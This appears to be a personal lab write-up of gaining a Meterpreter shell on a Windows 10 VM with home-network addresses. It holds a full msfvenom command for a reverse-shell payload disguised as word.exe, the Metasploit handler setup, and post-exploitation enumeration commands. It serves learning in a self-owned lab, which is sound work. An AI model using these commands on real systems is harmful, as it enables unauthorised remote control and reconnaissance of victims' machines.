# Day 4 — Windows Privilege Escalation (Phase A: initial access via Meterpreter)  
**Author:** Shaafi (FROSTmatic-hub)  
**Objective:** Obtain an interactive shell on the Windows 10 lab VM and perform initial safe enumeration. Prepare for automated privilege escalation checks.

---

## Lab setup & safety
- Host: my laptop (home network)  
- Attacker: Kali VM — IP: `192.168.31.213` (bridged)  
- Target: Windows 10 VM — IP: `192.168.31.159` (bridged)  
- Snapshot created before exploit: `day4_before_exploit` (recommended)

> **Ethics:** All actions performed on owned lab VMs only. No external systems targeted.

---

## Access method (payload & handler)
- Payload generated with `msfvenom` (Windows Meterpreter EXE).  
- `msfconsole` handler configured:  
  - `LHOST = 192.168.31.213`  
  - `LPORT = 5555`

**Example used**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.213 LPORT=5555 -f exe -o word.exe
# Metasploit handler:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.31.213
set LPORT 5555
run
```
## Evidence (Meterpreter outputs)
- `getuid`: Server username: DESKTOP-TD9BS8A\test
- `sysinfo`: 
    Computer   : DESKTOP-TD9BS8A
    OS         : Windows 10 (10.0 Build 10240)
    Architecture: x64
    System Language: en_US
    Domain     : WORKGROUP
## Basic (non-destructive) enumeration commands executed
```bash
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getprivs
meterpreter> ipconfig
meterpreter> ps
meterpreter> shell
C:\> whoami
C:\> whoami /priv
C:\> net localgroup administrators
C:\> sc queryex type= service
C:\> schtasks /query /fo LIST /v
#Saved output to output/day4_meterpreter_basic.txt

